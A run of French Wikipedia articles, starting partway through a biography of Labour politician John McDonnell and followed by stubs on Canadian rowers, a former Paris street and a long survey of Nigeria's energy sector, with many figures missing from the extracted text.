Il rejoint le Parti travailliste en 1974, et travaille dans le département d'assurance sociale de l'Union nationale des mineurs ("National Union of Mineworkers"), puis du Congrès des syndicats ("Trades Union Congress"). En 1981, à l'âge de 29 ans, il est élu membre du Conseil du Grand Londres ("Greater London Council"), représentant le Parti travailliste et la circonscription de Hayes et Harlington. Il est nommé numéro deux de l'administration municipale dirigée par Ken Livingstone, et est chargé des finances et du budget. Il met en place une politique de grands investissements dans les services publics. Toutefois, lorsqu'il insiste pour faire réduire le prix des billets des transports publics à Londres, malgré un ordre contraire des tribunaux, Livingstone le limoge, peu avant que le Conseil du Grand Londres ne soit abrogé par le gouvernement de Margaret Thatcher en 1986. En 1987, il devient président de l'Association des autorités publiques de Londres, chargé de représenter les autorités des arrondissements de Londres « dans leurs relations avec le gouvernement central et avec l'Europe ».
Député.
Il se présente sans succès aux élections législatives de 1983, puis de 1992. Il est finalement élu député travailliste de la circonscription de Hayes et Harlington, avec 62 % des voix, lors des élections législatives de 1997. Ces élections marquent le retour triomphal des Travaillistes au pouvoir, après dix-huit ans dans l'opposition. Porté par Tony Blair, le parti est devenu le « New Labour », abandonnant ses racines socialistes et ouvrières pour se rapprocher du centre en politique. McDonnell, toutefois, appartient à l'aile gauche du parti, et devient membre du Groupe de campagne socialiste, qui rassemble les députés de la gauche du Parti travailliste, et dont il devient à terme le président. 
Réélu en 2002 et 2005 durant les années Blair, tenu à l'écart des instances dirigeantes du parti, il siège comme simple député, et fait partie des « rebelles » du groupe parlementaire. En 2003, il vote contre la guerre d'Irak. Il prend la tête d'un groupe de pression appelé « Services publics, pas profits privés » ("Public Services Not Private Profit"), qui s'oppose à la politique de partenariat public-privé introduite par le gouvernement Blair dans les services publics, et notamment dans le service de santé publique. Le groupe rassemble seize syndicats et plusieurs autres organisations. McDonnell s'oppose également à l'introduction puis à l'augmentation de frais d'inscription aux universités, ainsi qu'aux politiques de surveillance et de restrictions des libertés publiques introduites par le gouvernement Blair dans le cadre de la lutte contre le terrorisme. En 2003, il déclenche une controverse en honorant publiquement Bobby Sands et « le courage et les sacrifices » des membres de l'IRA durant le conflit nord-irlandais. Il est contraint de clarifier ses propos : « Les négociations sur l'avenir de l'Irlande du Nord n'auraient pas eu lieu si cela n'avait pas été pour les actions militaires de l'IRA. Que je sois clair : Je tiens en horreur le fait de tuer des êtres humains innocents. Mon argument, c'était que les républicains [c'est-à-dire les nationalistes irlandais] avaient le droit d'honorer ceux qui ont rendu possible ce processus de négociation qui a mené à la paix ». En 2015, il admet qu'il n'aurait jamais dû prononcer de tels propos, et présente ses excuses lors de l'émission télévisée politique "Question Time".
Il est réélu député en 2010 (lorsque les Travaillistes perdent le pouvoir), et en 2015. En 2007, puis à nouveau en 2010, il souhaite se porter candidat à la direction du Parti travailliste, mais est soutenu par trop peu de députés, et sa candidature n'est pas validée. Ayant souffert d'une crise cardiaque, il renonce à une troisième tentative en 2015, et préside la campagne de son ami Jeremy Corbyn, dont il partage les principales convictions. Corbyn est élu chef du parti le 12 septembre, et nomme McDonnell au poste de Chancelier de l'Échiquier fantôme dans son Cabinet fantôme, malgré les critiques et les inquiétudes de l'aile droite du parti. Il est ainsi chargé d'articuler et de défendre la politique économique anti-austéritaire que souhaite porter Corbyn, ainsi que sa volonté d'avoir recours à une politique d'assouplissement quantitatif pour stimuler l'économie et créer des emplois. McDonnell exprime ainsi sa position : « Nier le déficit budgétaire serait absurde si nous souhaitons être crédibles sur le plan économique auprès de l'électorat. […] Donc, pour être clair : Le Parti travailliste sous Jeremy Corbyn s'engage à éliminer le déficit et à forger une économie où nous vivrons en accord avec nos moyens. [Mais] nous ne pensons pas que la grande majorité des personnes, aux revenus moyens ou faibles, qui n'ont pas provoqué cette crise économique, devraient payer pour la résoudre ». Il développe le programme économique que les travaillistes présentent aux élections législatives de 2017 : « renationalisation des chemins de fer, de l’électricité, de l’eau et de la poste, relance budgétaire, contrôle plus étroit des banques, actionnariat populaire dans les grandes entreprises ».

</doc>
<doc id="9412938" url="https://fr.wikipedia.org/wiki?curid=9412938" title="Cristy Nurse">
Cristy Nurse

Cristy Nurse, née le , est une rameuse canadienne.

</doc>
<doc id="9412940" url="https://fr.wikipedia.org/wiki?curid=9412940" title="Jennifer Martins">
Jennifer Martins

Jennifer Martins, née le , est une rameuse canadienne.

</doc>
<doc id="9412941" url="https://fr.wikipedia.org/wiki?curid=9412941" title="Tsubomi (actrice pornographique)">
Tsubomi (actrice pornographique)

 est une idole de la vidéo pour adultes et actrice de films pornographiques japonaise née le &lt;time&gt;&lt;/time&gt; à Yamaguchi. En , elle était apparue dans plus de vidéos pour adultes, dont plus de la moitié est des compilations.
Biographie.
Tsubomi est née le à Yamaguchi.

</doc>
<doc id="9412942" url="https://fr.wikipedia.org/wiki?curid=9412942" title="Christine Roper">
Christine Roper

Christine Roper, née le , est une rameuse canadienne.

</doc>
<doc id="9412943" url="https://fr.wikipedia.org/wiki?curid=9412943" title="Rue Childebert (Paris)">
Rue Childebert (Paris)

La rue Childebert est une ancienne voie, aujourd'hui disparue, située dans le quartier de la Monnaie dans l'ancien de Paris (actuel ).
Situation.
Longue de , et large de 30 pieds, soit , elle reliait la rue d'Erfurth à partir des , à la rue Sainte-Marthe aux (voies disparues).
Historique.
Elle est ouverte en 1715 au sud de l'enclos de l'abbaye Saint-Germain-des-Prés en même temps que la rue d'Erfurth et la rue Sainte-Marthe par Henri-Pons de Thiard de Bissy, abbé commendataire. Elle est nommée en l'honneur de Childebert, fondateur de l'abbaye. Les immeubles de rapport sont construits par Victor-Thierry Dailly. Au carrefour avec la rue d'Erfurth, le cardinal de Bissy fait construire en 1716 par le même architecte deux fontaines identiques à chaque angle, dites fontaines Childebert.
Jusqu'à la Révolution, elle est séparée de la place Saint-Germain-des-Prés par des grilles qui étaient fermées tous les soirs. Elles sont visibles sur le plan de Turgot. À l'intérieur de cet enclos, il était interdit aux huissiers de procéder à des saisies.
Une décision ministérielle du a fixé la largeur de cette rue à . Quelques maisons sont détruites pour permettre le prolongement de la rue Saint-Germain-des-Près (actuelle rue Bonaparte), décidé par une ordonnance du . 
La rue est supprimée dans le cadre du prolongement de la rue de Rennes et de la création du boulevard Saint-Germain, décidé par le décret du . Elle disparaît complètement en octobre-. Les fontaines Childebert sont démontées en 1867 : l’une est remontée en 1875 dans le square Monge (aujourd’hui square Paul-Langevin) et l’autre est déposée à Paris au musée Carnavalet.
La rue Childebert dans la littérature.
Cette rue et son histoire inspirèrent quelques écrivains :

</doc>
<doc id="9412945" url="https://fr.wikipedia.org/wiki?curid=9412945" title="Énergie au Nigeria">
Énergie au Nigeria

Le secteur de l'énergie au Nigeria est marqué par le poids dominant de l'industrie pétrolière et gazière qui apporte 90 % des revenus d'exportation en 2021. Mais du point de vue des consommateurs, il est caractérisé avant tout par la faiblesse de la consommation d'énergie primaire : 41 % de la moyenne mondiale (mais 2,2 fois la moyenne africaine) en 2021, et par la part prépondérante de la biomasse dans cette consommation : 74,5 % en 2021.
La production d'énergie primaire au Nigeria se répartissait en 2021 entre le pétrole : 30,5 %, le gaz naturel : 15,3 % (production multipliée par onze depuis 1990) et la biomasse : 53,3 %. Le Nigeria se classe en 2022 au mondial pour ses réserves de pétrole et au mondial pour sa production de pétrole, au mondial pour ses réserves de gaz naturel, au mondial pour sa production de gaz naturel et au mondial pour ses exportations de gaz naturel.
La consommation d'énergie primaire repose pour l'essentiel sur la biomasse : 74,5 % en 2021, et les combustibles fossiles : 25,1 % (pétrole : 14,0 % ; gaz naturel : 10,1 %, charbon : 0,9 %).
L'électricité représente seulement 1,7 % de la consommation finale d'énergie du Nigeria en 2021, taux d'électrification parmi les plus bas au monde. La production d'électricité utilise très majoritairement le gaz naturel : 77,8 % en 2021, et secondairement l'hydroélectricité : 22,0 %. La consommation d'électricité par habitant en 2021 atteint seulement 3 % de la moyenne mondiale et 17 % de la moyenne africaine.
Les émissions de liées à l'énergie par habitant sont très faibles : 10,7 % de la moyenne mondiale et 52 % de la moyenne africaine en 2022. Mais elles progressent cinq fois plus vite que la moyenne mondiale : +53 % contre +10,6 % entre 1990 et 2022. Les fuites et vols de pétrole ainsi que le torchage du gaz naturel associé au pétrole causent des pollutions de grande ampleur dans le delta du Niger.
Comparaisons internationales.
Dans les classements de l'Agence internationale de l'énergie et de l'Energy Institute, le Nigeria apparait comme :
Production d'énergie primaire.
Le Nigeria est le plus grand producteur de pétrole d'Afrique, détient les plus grandes réserves de gaz naturel sur le continent et figure parmi les cinq premiers exportateurs mondiaux de gaz naturel liquéfié (GNL). Il est membre de l'OPEP depuis 1971, plus d'une décennie après le début de la production de pétrole dans l'état de Bayelsa dans les années 1950. La production de pétrole souffre cependant de ruptures d'approvisionnement qui ont pu atteindre par jour. L'industrie pétrolière et gazière du Nigeria est située principalement dans la zone méridionale du Delta du Niger.
Les hydrocarbures sont les principales ressources de l'économie nigériane. L'industrie pétrolière et gazière apporte 90 % des revenus d'exportation en 2021. L'économie du Nigeria est très vulnérable à la baisse des prix du brut.
Pétrole.
Réserves.
BGR (Agence fédérale allemande pour les sciences de la Terre et les matières premières) estime les réserves prouvées de pétrole du Nigeria à (millions de tonnes) fin 2022, soit 2,0 % du total mondial, au mondial et au second rang en Afrique derrière la Libye (). Ces réserves représentent de production au rythme de 2022 (. Les ressources potentielles supplémentaires sont estimées à , au mondial.
La majorité des réserves se trouve dans le Delta du Niger et en mer dans le Golfe du Bénin, le Golfe de Guinée et le Golfe de Bonny. Les activités d'exploration récentes se concentrent surtout sur l'offshore profond et ultra-profond. NNPC a entrepris des campagnes d'exploration à terre dans le nord-est du Nigeria, dans le bassin du Tchad, mais le manque de découvertes et la présence du groupe Boko Haram ont mis l'exploration à l'arrêt. L'exploration dans le Delta du Niger a décru à cause des problèmes croissants de sécurité liés au vol de pétrole et au sabotage d'oléoducs. Plusieurs majors pétroliers ont vendu leurs actifs terrestres, donnant à des compagnies nigérianes l'opportunité d'entrer dans le secteur. Les incertitudes sur les investissements dues au projet de loi PIB ont aussi contribué à différer l'investissement dans les projets en eau profonde, dont les dates de démarrage ont été continuellement repoussées.
Production.
En 2023, le Nigeria a produit (millions de barils par jour), soit (millions de tonnes) de pétrole, en hausse de 6,7 % par rapport à 2022, mais en baisse de 32 % depuis 2013. Il se classe au mondial avec 1,6 % de la production mondiale et au en Afrique avec 21,6 % de la production africaine.
En 2022, le Nigeria a produit de pétrole ; c'est le niveau le plus bas, en moyenne annuelle, depuis plus de trente ans, bien en-dessous du quota de fixé par l'Opep. Le cadre légal a longtemps dissuadé les compagnies pétrolières internationales d'investir. L'entrée en vigueur d'une nouvelle loi sur la taxation des profits a été sans cesse décalée. Elle a finalement été votée en 2021. Le sous-investissement affecte aussi les projets qui sont déjà en phase d'exploitation. L'insécurité et la corruption sont généralisées dans la région pétrolière du delta. Les enlèvements de salariés du secteur pétrolier sont fréquents. Le vol de pétrole concernerait entre . Oléoducs, tankers, raffineries, des infrastructures de grande envergure sont mobilisées pour cette économie parallèle à laquelle participe une partie de l'armée, des autorités locales et de la compagnie pétrolière nationale.
La production de brut a atteint un pic de en 2005, puis a décliné, sous l'effet des violences perpétrées par des groupes militants, jusqu'à en 2009 ; une légère reprise s'est produite après l'amnistie accordée à ces groupes en 2009 en échange de leur désarmement, et surtout grâce au développement de l'offshore. Le Nigeria produit surtout du brut léger à basse teneur en soufre. Aucun champ pétrolier majeur n'a été mis en production depuis celui d'Usan (, offshore profond) en ; le petit gisement de Bonga Nord-ouest () mis en service en 2014 a permis de compenser le déclin de la production. Plusieurs projets en eau profonde ont été repoussés depuis plusieurs années à cause de l'incertitude créée par le projet de loi PIB : seuls deux projets sur neuf ont été entérinés par les groupes pétroliers. Le potentiel des projets repoussés est estimé à sur les cinq prochaines années, dont seulement 23 % ont atteint le stade final de leur développement. Les principaux projets en eau profonde sont ceux de Total à Egina ( prévus pour 2019 ou plus tard) et de Shell à Bonga sud-ouest et Aparo ( prévus pour 2020 ou plus tard). La chute du prix du brut en 2014 va exacerber l'attentisme des investisseurs.
Le gisement en eau profonde de Bonga, découvert en 1996, a été mis en service en 2006 grâce à une unité flottante de production, de stockage et de déchargement d'une capacité de production de par jour, ainsi que de mètres cubes de gaz naturel par jour, livrés à l'usine de liquéfaction de Bonny Island via un gazoduc. Le gisement d'Akpo a commencé sa production en 2009 également au moyen d'une unité flottante de production, de stockage et de déchargement.
Les vols de pétrole ont varié, atteignant parfois ; cette estimation est cependant contestée car elle pourrait inclure les pertes dues à une maintenance insuffisante. Au début des années 2000, une vague d'actes de vandalisme, d'enlèvements et d'attaques sur des installations pétrolières a été déclenchée par des groupes locaux, en particulier le Mouvement pour l'émancipation du Delta du Niger (MEND), revendiquant la redistribution des richesses pétrolières et un plus grand contrôle local sur le secteur pétrolier. L'amnistie de 2009 a produit un reflux de ces attaques, permettant aux compagnies de réparer les dégâts. Mais le manque de progrès dans la création d'emplois et le développement a contribué à une reprise des vols et attaques. Des réseaux complexes associant la jeunesse locale et les communautés villageoises à des professionnels tels que des banquiers corrompus, des responsables gouvernementaux et des policiers, organisent le trafic du pétrole volé à divers niveaux de la chaîne de production : puits d'extraction, oléoducs, réservoirs de stockage des terminaux d'exportation. Le pétrole volé est pompé sur des barges ou de petits tankers puis transféré sur des tankers de grande taille au large. Une partie est raffinée dans des raffineries clandestines dont les produits sont vendus sur le marché local, mais la grande majorité du brut volé est exportée via les terminaux d'exportation ou par camions.
La piraterie s'est développée ; les experts de la sécurité estiment que la côte de l'Afrique de l'ouest est devenue la plus dangereuse au monde, surpassant celle de l'Afrique de l'est (en particulier celle de la Somalie). Plusieurs attaques de pirates ont causé des blessures et des morts parmi les membres d'équipage, mais selon le Bureau maritime international, les actes de piraterie sont sous-déclarés par crainte d'une recrudescence de ces attaques, de l'augmentation des coûts d'assurance et de divulgation d'information confidentielles sur les bateaux. La piraterie en Afrique occidentale se concentre plus sur les vols de pétrole que sur les prises d'otages ; des cargaisons entières ont été volées ; certains analystes soupçonnent les pirates d'être des militants des groupes nigérians tels que le MEND. Un des principaux obstacles dans la lutte contre la piraterie est le refus du gouvernement nigérian d'autoriser la présence de gardes armés étrangers dans ses eaux territoriales, tactique qui a prouvé son efficacité en Afrique orientale.
Organisation du secteur.
La Nigerian National Petroleum Corporation (NNPC), créée en 1977 pour superviser la réglementation de l'industrie pétrolière et gazière, a aussi des responsabilités annexes pour les développements amont et aval. En 1988, la NNPC a été divisée en 12 filiales pour réguler les sous-secteurs de l'industrie. Le Département des ressources pétrolières du Ministère des ressources pétrolières est un autre régulateur clé, spécialisé dans la vérification de la conformité générale, les locations et les permis, ainsi que les normes environnementales. la plupart des projets pétroliers et gaziers sont basés sur des coentreprises entre NNPC, actionnaire majoritaire, et les groupes internationaux, en particulier Shell, ExxonMobil, Chevron, Total et Eni. Le reste des projets est géré par des contrats de partage de production avec les groupes internationaux, fiscalement plus avantageux, en particulier dans l'offshore profond. L'instabilité dans la région du Delta du Niger a amené les groupes internationaux à vendre leurs parts dans les gisements terrestres et en eau peu profonde à des compagnies nigérianes ou à des petites compagnies pour se concentrer sur l'offshore profond et les gisements terrestres de gaz naturel. Le "Petroleum Industry Bill" (PIB), projet de loi proposé en 2008, prévoyait un changement important de l'organisation du secteur et des règles fiscales, qui menaçait la viabilité de certains projets, en particulier dans l'offshore profond ; cette menace a fortement ralenti les investissements ; il n'y a eu aucun cycle d'octroi de licences depuis 2007 ; le projet n'a été soumis à l'Assemblée nationale qu'en .
Consommation et raffinage.
Le Nigeria n'a consommé que en 2014, soit 13 % de sa production de pétrole, en exportant 87 %.
Les subventions aux carburants ont coûté de dollars en 2011, soit 30 % des dépenses de l'État, près de 4 % du PIB et 118 % du budget d'investissement, le budget de l'éducation. Le , le gouvernement a supprimé les subventions fédérales, accusées de causer des distorsions de marché, grever les investissements dans l'aval pétrolier, perpétuer les inégalités économiques (les compagnies importatrices de carburants étant les principales bénéficiaires) et créer des opportunités de fraude. Mais le gouvernement a fait demi-tour deux semaines plus tard, rétablissant partiellement les subventions après un tollé public et des grèves massives organisées par les syndicats qui menaçaient d'arrêter la production de pétrole. Une commission d'enquête présidentielle a estimé les pertes associées aux détournements et à la mauvaise gestion du programme de subventions à de dollars ; une enquête chez les importateurs de produits pétroliers a conduit à plusieurs arrestations de négociants et à la suspension de compagnies accusées de siphonner les fonds et d'augmenter les prix.
Le Nigeria compte quatre raffineries : Port Harcourt I et II, Warri et Kaduna. Leur capacité totale est de ; elles fonctionnent constamment au-dessous de leur capacité du fait de pannes, incendies et sabotages sur leurs pipelines d'approvisionnement en brut ; leur taux d'utilisation combiné a été de 22 % en 2013. En conséquence, le pays doit importer des produits pétroliers : en 2013, bien que la capacité de ses raffineries soit supérieure à la demande intérieure. Le gouvernement planifie depuis plusieurs années la construction de nouvelles raffineries, mais le manque de financement et la politique de subventions aux carburants ont causé des retards. Une compagnie nigériane, le groupe Dangote, prévoit de construire pour de dollars une raffinerie de près de Lagos ; elle comprendrait un complexe de pétrochimie et d'engrais ; la mise en service est attendue pour la mi-2018 ; si elle est construite, elle sera la plus grande d'Afrique. Le projet controversé de loi PIB prévoyait de privatiser le secteur du raffinage et de libérer les prix des carburants en supprimant leurs subventions. Le gouvernement fédéral a envisagé fin 2013 de privatiser le secteur du raffinage, mais y a renoncé devant les menaces des deux principaux syndicats des travailleurs du pétrole de faire grève si les raffineries étaient vendues.
Aliko Dangote, l'homme le plus riche d'Afrique, inaugure sa raffinerie en mai 2023 avec l'ancien président nigérian Muhammadu Buhari, après plus de 10 ans de travaux et près de 24 milliards de dollars d'investissements. Sa capacité de , soit par an, en fait la plus grande raffinerie d'Afrique, et probablement l'une des plus importantes au monde. Il a fallu vaincre les résistances des traders locaux qui gagnaient des milliards de dollars chaque année en achetant sur le marché international pour revendre ensuite au Nigeria, et celle de la Nigerian National Petroleum Corporation (NNPC), la compagnie pétrolière nationale, qui faisait tout pour saboter le projet. La raffinerie a les capacités pour fournir l'équivalent de trois fois la consommation du pays, et a commencé à exporter.
Exportations.
En 2021, les exportations de pétrole brut du Nigeria s'élevaient à , soit 92 % de sa production. Ses importations de produits pétroliers atteignaient , alors que les raffineries nigérianes n'en ont produit que .
En 2014, le Nigeria a exporté de pétrole brut et condensats. Les États-Unis ont cessé en 2012 d'être le principal importateur de pétrole nigérian, puis ont reculé jusqu'au en 2014 ; cette évolution est due à la progression de la production américaine de pétrole de schiste qui présente les mêmes qualités que le pétrole nigérian ; l'Europe a pris la place des États-Unis, augmentant ses importations de plus de 40 % en 2011 et de 30 % en 2012. L'Inde est devenue le premier importateur avec 18 % en 2014. L'Europe reçoit 45 % de ces exportations, dont 10 % pour les Pays-Bas et 9 % pour l'Espagne ; 27 % sont destinées à l'Asie, dont 18 % pour l'Inde et 4 % pour l'Indonésie ; les Amériques reçoivent 15 %, dont 10 % pour le Brésil et 3 % pour les États-Unis ; l'Afrique reçoit 13 %, dont 7 % pour l'Afrique du Sud.
Guerre du Biafra.
L'accaparement de la rente pétrolière par l'état fédéral a suscité la guerre du Biafra de à ; elle commença avec la sécession de la région orientale du Nigeria, qui s'auto-proclama République du Biafra sous la direction du colonel Ojukwu. À la suite du blocus terrestre et maritime du Biafra par les troupes gouvernementales, la région fut plongée dans la famine, ce qui entraîna, selon les estimations, la mort d'un à deux millions de personnes.
De nouvelles tensions apparurent dans les années 1990, aboutissant à une insurrection de groupes armés en 2004, réprimée en 2008-2009 par les Forces armées nigérianes.
Gaz naturel.
Réserves.
Les réserves prouvées de gaz naturel du Nigeria étaient estimées par le BGR à (milliards de m) fin 2022, au mondial avec 2,8 % du total mondial et au en Afrique. Elles représentent de production au rythme de 2022 (). Les réserves potentielles supplémentaires étaient estimées à .
La plupart des réserves sont situées dans le Delta du Niger.
Production.
En 2023, le Nigeria a produit (milliards de m) de gaz naturel, soit (exajoules), en recul de 7,3 % par rapport à 2022, mais en progression de 32 % depuis 2013. Il se classe au mondial avec 1,1 % de la production mondiale.
La production a progressé jusqu'à la déclaration de force majeure par Shell en sur les fournitures de gaz naturel à l'usine de traitement de gaz et condensats de Soku, qui alimente le seul terminal de gaz naturel liquéfié du pays. Shell ferma l'usine pour réparer les dommages causés à un gazoduc connecté à l'usine qui avait été saboté par des groupes locaux qui siphonnaient les condensats. Elle ne fut rouverte que neuf mois plus tard, mais fut fermée à nouveau pour maintenance sur la plus grande partie de 2009, ce qui causa une forte baisse de la production et des exportations en 2009-2010. La production reprit ensuite sa progression, atteignant un pic de de pieds cubes en 2012 ; en 2013, elle baissa de 10 % à cause de ruptures d'approvisionnement et d'un blocage temporaire des expéditions de GNL.
Les principaux projets en cours de développement sont le champ de Sonam : de pieds cubes/jour (Mcf/d), développé par Chevron pour mise en production en 2016 et celui de Gbaran-Unie phase 2 : , développé par Shell pour mise en production en 2017.
Une part importante de la production brute de gaz naturel du Nigeria est brûlée à la torchère parce que certains champs de pétrole n'ont pas l'infrastructure nécessaire pour capter le gaz associé au pétrole. En 2013, le torchage a représenté de pieds cubes (Bcf), soit 15 % de la production brute. Selon la National Oceanic and Atmospheric Administration américaine (NOAA), le Nigeria représentait 10 % du total mondial torché en 2011. Ce montant a cependant diminué récemment, de en 2010 à en 2013. Selon Shell, l'un des principaux producteurs de gaz au Nigeria, les principaux obstacles à la réduction du torchage ont été la situation d'insécurité dans le Delta et le manque de financement pour les projets de captage du gaz associé. Le gouvernement a lancé des projets pour éliminer le torchage et utiliser le gaz ainsi récupéré pour produire de l'électricité, mais les progrès sont limités à cause de l'insécurité.
Exportations.
Les exportations par voie maritime, sous forme de GNL, se sont élevées à (milliards de m) en 2023, soit 40 % de la production nationale, 3,2 % des exportations mondiales de GNL et 1,4 % des exportations mondiales totales, au mondial. Elles étaient destinées surtout à l'Europe : (53 %), dont pour l'Espagne et pour la France, et à l'Asie : (31 %), dont pour la Chine, pour l'Inde, pour la Corée du sud, etc.
Le Nigeria se plaçait en 2013 parmi les cinq plus grands exportateurs de GNL avec le Qatar, la Malaisie, l'Australie et l'Indonésie ; il représentait 7 % du marché mondial du GNL, dont 23 % vers le Japon, 17 % vers la Corée du Sud et 14 % vers l'Espagne. Les exportations vers l'Europe ont décru de 67 % en 2010 à 31 % en 2013, au profit du Japon qui a multiplié ses importations de gaz nigérian par six à la suite de l'accident nucléaire de Fukushima ; les exportations vers les États-Unis ont décliné de en 2006 à en 2013, sous l'effet du boom du gaz de schiste.
Le terminal GNL de Bonny Island, le seul du Nigeria, est exploité par Nigeria LNG Ltd (NNPC 49 %, Shell 25,6 %, Total 15 %, Eni 10,4 %) ; il a six lignes de liquéfaction d'une capacité totale de de tonnes par an () de GNL et de tonnes par an de gaz de pétrole liquéfié (GPL) ; une septième ligne est prévue pour porter la capacité du terminal à plus de de tonnes par an. Un consortium entre NNPC, Total et Eni développe le projet de terminal LNG de Brass, dont la capacité sera de de tonnes par an, mais qui a pris plusieurs années de retard.
Le Nigeria exporte de faibles quantités de gaz par le gazoduc West African Gas Pipeline (WAGP) qui a commencé à fonctionner en 2011 ; il est géré par une coentreprise réunissant Chevron (36,9 %), NNPC (24,9 %), Shell (17,9 %), la compagnie ghanéenne Takoradi Power Cy Ltd (16,3 %) et les compagnies de gaz du Togo et du Bénin (2 % chacune). Ce gazoduc de () transporte du gaz depuis la région d'Escravos au Nigeria jusqu'au Ghana en passant par le Bénin et le Togo, où il est surtout utilisé pour la production d'électricité ; il s'alimente à partir du gazoduc Escravos-Lagos et est déposé en mer à une profondeur moyenne de ; sa capacité est de , mais n'est encore utilisée qu'à hauteur d'un tiers ; en 2013, le Nigeria a exporté par ce gazoduc. Le Nigeria et l'Algérie ont formé des plans pour construire le Gazoduc trans-saharien ("Trans-Saharan Gas Pipeline" - TSGP), long de () depuis les gisements du Delta du Niger jusqu'au terminal algérien de Beni Saf sur la côte méditerranéenne, afin d'alimenter l'Europe ; en 2009, NNPC a signé un protocole d'accord avec la Sonatrach pour développer ce projet ; plusieurs compagnies internationales ont manifesté leur intérêt pour ce projet, dont Total et Gazprom ; les problèmes de sécurité sur tout le trajet du gazoduc, les coûts croissants et l'incertitude politique au Nigeria ont continué à retarder ce projet.
Conversion gaz→liquide.
Un projet de conversion de gaz naturel en diesel synthétique pour véhicules a démarré à mi-2014 et devrait atteindre sa pleine capacité ( de gaz transformés en de diesel) à mi-2015 ; l'usine appartient à Chevron (75 %) et NNPC (25 %) avec l'expertise du sud-africain Sasol.
Consommation.
Le Nigeria n'a consommé que 47,2 % de sa production de gaz naturel en 2021, dont 37 % pour la production d'électricité, 27 % pour les besoins propres de l'industrie énergétique, 17 % dans le reste de l'industrie et 9 % pour les usages non-énergétiques (chimie).
Charbon.
Les réserves prouvées récupérables de charbon du Nigeria étaient estimées par l'Agence fédérale allemande pour les sciences de la terre et les matières premières (BGR) à (millions de tonnes) fin 2022, soit 0,04 % des réserves mondiales. Elles représentent de production au rythme de 2022 : . BGR estime les ressources supplémentaires identifiées, mais dont l'exploitation n'est pas techniquement ou économiquement justifiée, à . BGR estime les ressources sud-africaines de lignite (non exploitées) à et les ressources potentielles supplémentaires à .
Uranium.
En , la Russie a signé un accord de coopération avec le Nigeria, dans lequel étaient prévus l'exploration et l'exploitation minière de l'uranium dans le pays.
Consommation intérieure brute d'énergie primaire.
La consommation d'énergie primaire par habitant au Nigeria était de (Gigajoules) en 2021, soit seulement 41 % de la moyenne mondiale (), mais 2,2 fois la moyenne africaine ().
La consommation d'énergie au Nigeria ne représentait que 61 % de sa production en 2019 : le pays exportait 98 % de sa production de pétrole brut et 59 % de sa production de gaz naturel, et la biomasse traditionnelle couvrait 75 % de sa consommation ; ce pourcentage n'a que légèrement baissé depuis 1990 (79 %). La précision et la fiabilité des statistiques sur la biomasse sont certes limitées, mais l'ordre de grandeur est significatif d'une société dont la grande majorité est restée au stade pré-industriel. L'Energy Information Administration américaine estimait en 2014 à 80 % la part de la biomasse et des déchets (bois, charbon de bois, fumier, résidus de récolte) dans la consommation primaire et leur utilisation pour la cuisine et le chauffage, surtout en zone rurale ; elle note l'imprécision de ces estimations du fait de l'absence de marchés observables pour cette biomasse.
Consommation finale d'énergie.
La consommation finale d'énergie au Nigeria (après raffinage, transformation en électricité ou en chaleur de réseau, transport, etc) a évolué comme suit :
La répartition par secteur de la consommation finale d'énergie a évolué comme suit :
Secteur de l'électricité.
La capacité de production d'électricité du Nigeria atteignait en 2012, dont (65 %) à combustibles fossiles, (33 %) d'hydroélectricité, (1 %) de biomasse et déchets et d'éolien, mais la production n'atteignait que en moyenne, soit la moitié de la capacité. Le secteur électrique souffre d'insuffisance de maintenance, de pénuries d'approvisionnement en gaz et d'un réseau de transport et de distribution inadapté. Seulement 41 % des Nigérians ont accès à l'électricité et le demande réelle est estimée à . Le Nigeria a l'un des taux de production d'électricité par habitant les plus bas au monde ; les Nigérians qui ont accès au réseau sont confrontés à des délestages, à des black-outs et à la dépendance envers leurs générateurs de secours, qui selon un rapport de 2010 produisent plus de 30 % de l'électricité malgré leur faible efficacité.
Le , le gouvernement fédéral a vendu presque toutes ses compagnies de production (cinq sur six) et de distribution (dix sur onze) d'électricité à des compagnies privées ; les deux compagnies restantes seront rattachées à la compagnie publique de transport d'électricité, qui reste nationalisée. La privatisation faisait partie de la réforme du secteur initiée par l' "Electric Power Sector Reform Act" de 2005, prévoyant le démantèlement de la Power Holding Company of Nigeria (PHCN) qui supervisait les entreprises publiques de production et distribution. Le gouvernement souhaite vendre dix centrales à gaz relevant des "National Integrated Power Projects" (NIPP) lancés en 2004 afin d'utiliser le gaz associé au pétrole jusqu'ici torché ; mais le Nigeria souffre d'une pénurie de gaz pour les centrales électriques, car il est plus rentable pour les producteurs de gaz d'exporter leur gaz, les prix intérieurs étant plus bas ; ceci empêche le gouvernement de trouver acquéreur pour ces centrales.
Production d'électricité.
Centrales thermiques classiques.
Parmi les principales centrales :
Le gouvernement a signé en un accord avec la compagnie turque "Koztek Electric and Energy Technologies" en vue de la construction de nouvelles centrales et de lignes de transport « entièrement financées par des intérêts commerciaux turcs ». En "Geometric Power" a annoncé son projet de construire une centrale de dans l'état d'Abia, au sud-est, en partenariat avec General Electric. La mise en service de la première phase de du projet est attendue en 2019 à un coût de de dollars.
Projets nucléaires.
Le premier réacteur de recherche du Nigeria a été mis en service à l'université Ahmadu Bello en 2004. C'est un réacteur miniature chinois à source de neutrons de , utilisant de l'uranium hautement enrichi. L'IAEA a assisté le gouvernement nigérian sur ce projet.
Afin de satisfaire rapidement la demande croissante d'électricité, le Nigeria a sollicité au début des années 2000 l'aide de l'Agence internationale de l'énergie atomique (AIEA) pour développer des projets visant de puissance nucléaire en 2025. Sa demande était prévue à pour 2007, bien que la puissance délivrée au réseau en 2006 ait été seulement de . des coupures de courant ont poussé des industries à se relocaliser au Ghana. Le Ministère fédéral de l'électricité, chargé de la production d'électricité, des réseaux et de la tarification, a fait approuver en 2007 par le gouvernement fédéral un cadre technique ou « feuille de route » pour son programme nucléaire. Un plan stratégique a été adopté en 2009, avec un objectif de de nucléaire en 2020 et supplémentaires en 2030. En 2013 des préparatifs ont été menés pour une mission IAEA INIR en 2014.
